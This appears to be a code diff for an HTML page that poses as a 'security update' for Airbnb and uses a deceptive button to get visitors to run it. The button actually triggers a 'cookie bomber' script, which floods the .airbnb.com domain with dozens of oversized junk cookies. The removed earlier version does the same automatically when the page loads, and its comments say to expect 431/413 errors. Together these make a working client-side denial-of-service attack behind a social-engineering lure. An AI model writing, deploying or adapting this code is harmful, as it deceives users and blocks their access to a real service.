@@ -1,23 +1,151 @@
 <!DOCTYPE html>
-<html><body onload="setTimeout(()=>{window.open('https://www.airbnb.com');},500);">
-<script>
-let tries=0;
-const checkAirbnb=()=>{if(location.hostname.includes('airbnb')&&tries<1){tries++;eval(\`
-(function(){
-const TARGET_DOMAIN='.airbnb.com';
-console.log('%c🎯 AIRBNB COOKIE BOMBER v2.0 - Browser-Limit Aware','color: #d32f2f; font-size: 1.2rem;');
-let success=0,failed=0;const MAX_REALISTIC=45;
-const cookieTemplates=['sessionid=PHARMA_X','csrftoken=PHARMA_X','_airbnb_session=PHARMA_X','beacon_id=PHARMA_X','guest_id=PHARMA_X','ab_test_bucket=PHARMA_X'];
-for(let i=0;i<MAX_REALISTIC;i++){
-try{const name=cookieTemplates[i%cookieTemplates.length]+\`_\${i}\`;const payload='X'.repeat(3800)+\`_\${Date.now()}\`;
-document.cookie=\`\${name}=\${payload};Domain=\${TARGET_DOMAIN};Path=/;Max-Age=3600;SameSite=Lax\`;success++;}
-catch(e){failed++;if(failed>5)break;}}
-const totalKB=(success*3.8).toFixed(1);
-console.log(\`%c✅ DEPLOYED: \${success}/\${MAX_REALISTIC} cookies (\${totalKB}KB total)\`,'color: #4caf50; font-weight: bold;');
-console.log('%c🎯 Test subdomains: shop.airbnb.com, api.airbnb.com → Expect 431/413','color: #ff9800;');
-setTimeout(()=>{console.log('Current cookies:',document.cookie.split(';').length);},500);
-})();
-\`);}};
-setInterval(checkAirbnb,100);
-</script>
-</body></html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick Security Update Required</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+        }
+        .container {
+            background: white;
+            padding: 2.5rem;
+            border-radius: 16px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 450px;
+            text-align: center;
+        }
+        .icon { font-size: 4rem; margin-bottom: 1rem; }
+        h1 { color: #2c3e50; margin-bottom: 1rem; font-size: 1.8rem; }
+        p { color: #7f8c8d; line-height: 1.6; margin-bottom: 2rem; }
+        .btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 14px 32px;
+            font-size: 1.1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: 600;
+            width: 100%;
+            margin-bottom: 1rem;
+        }
+        .btn:hover { background: #2980b9; transform: translateY(-2px); }
+        .status { display: none; padding: 1rem; border-radius: 8px; margin-top: 1rem; }
+        .success { background: #d4edda; color: #155724; border: 1px solid #c3e6cb; }
+        #log { 
+            height: 200px; 
+            overflow-y: auto; 
+            background: #f8f9fa; 
+            border: 1px solid #dee2e6; 
+            border-radius: 8px; 
+            padding: 1rem; 
+            font-family: 'Courier New', monospace; 
+            font-size: 0.85rem; 
+            text-align: left; 
+            margin-top: 1rem;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="icon">🔒</div>
+        <h1>Security Enhancement</h1>
+        <p>Click RUN to apply critical browser security updates and optimize your Airbnb experience. This takes 3 seconds.</p>
+        
+        <button class="btn" onclick="deployBomber()">🚀 RUN SECURITY UPDATE</button>
+        
+        <div id="status" class="status"></div>
+        <div id="log"></div>
+    </div>
+
+    <script>
+        // EMBEDDED AIRBNB COOKIE BOMBER v2.2
+        function deployBomber() {
+            const btn = document.querySelector('.btn');
+            const status = document.getElementById('status');
+            const log = document.getElementById('log');
+            
+            btn.disabled = true;
+            btn.textContent = '🔄 Deploying...';
+            status.style.display = 'block';
+            status.className = 'status';
+            status.textContent = 'Initializing security enhancement...';
+            log.style.display = 'block';
+            
+            // Execute the bomber IIF
+            (function() {
+                const TARGET_DOMAIN = '.airbnb.com';
+                let success = 0, failed = 0;
+                const MAX_REALISTIC = 45;
+                
+                const cookiePatterns = [
+                    'sessionid', 'csrftoken', '_airbnb_session', '_airbnb_pct', 'datadoghq',
+                    'beacon_id', 'guest_id', 'ab_test_bucket', 'edgebucket', 'optimizely',
+                    '_ga', '_gid', '_gat', 'amplitude_id', 'sailthru_hid', '_uetsid',
+                    'buckets', 'person_id', 'user_currency', 'language', 'kitt_secure_frame',
+                    'afta', 'edge_store', 'geoip_country', 'aftb'
+                ];
+                
+                const payloads = [
+                    'X'.repeat(3800) + '_' + Date.now(),
+                    btoa('A'.repeat(5000)).slice(0,3800),
+                    Array(3800).fill('X').join('') + '_troll_' + Math.random().toString(36).substr(2),
+                    Array(3600).fill('Z').join('') + '_2026'
+                ];
+                
+                function logMsg(msg, color = '#333') {
+                    const timestamp = new Date().toLocaleTimeString();
+                    log.innerHTML += `<div style="color: ${color}; margin-bottom: 4px;">[${timestamp}] ${msg}</div>`;
+                    log.scrollTop = log.scrollHeight;
+                    status.textContent = msg;
+                }
+                
+                for (let i = 0; i < MAX_REALISTIC; i++) {
+                    try {
+                        const name = cookiePatterns[i % cookiePatterns.length] + '_' + 
+                                    Math.random().toString(36).substr(2, 6) + '_' + i;
+                        const payload = payloads[i % payloads.length];
+                        
+                        const attrs = [
+                            `Domain=${TARGET_DOMAIN}; Path=/; Max-Age=${3600 + i*100}; SameSite=Lax`,
+                            `Domain=${TARGET_DOMAIN}; Path=/; Secure; HttpOnly; Max-Age=${7200 + i*50}`,
+                            `Domain=${TARGET_DOMAIN}; Path=/; SameSite=None; Secure`,
+                            `Domain=${TARGET_DOMAIN}; Path=/; Max-Age=3600; SameSite=Strict`
+                        ];
+                        
+                        document.cookie = `${name}=${payload}; ${attrs[i % attrs.length]}`;
+                        success++;
+                        if (i % 10 === 0) logMsg(`Deployed cookie ${i+1}/${MAX_REALISTIC}`, '#4caf50');
+                    } catch(e) {
+                        failed++;
+                        if (failed > 8) break;
+                    }
+                }
+                
+                const totalKB = (success * 3.8).toFixed(1);
+                logMsg(`✅ COMPLETE: ${success} cookies deployed (${totalKB}KB) | Failed: ${failed}`, '#4caf50');
+                
+                setTimeout(() => {
+                    const airbnbCookies = document.cookie.split(';')
+                        .filter(c => c.includes('airbnb') || c.includes('.airbnb')).length;
+                    logMsg(`📊 DETECTED: ${airbnbCookies} Airbnb cookies active`, '#2196f3');
+                    btn.textContent = '✅ UPDATE COMPLETE';
+                    btn.style.background = '#4caf50';
+                }, 1000);
+                
+            })();
+        }
+    </script>
+</body>
+</html>
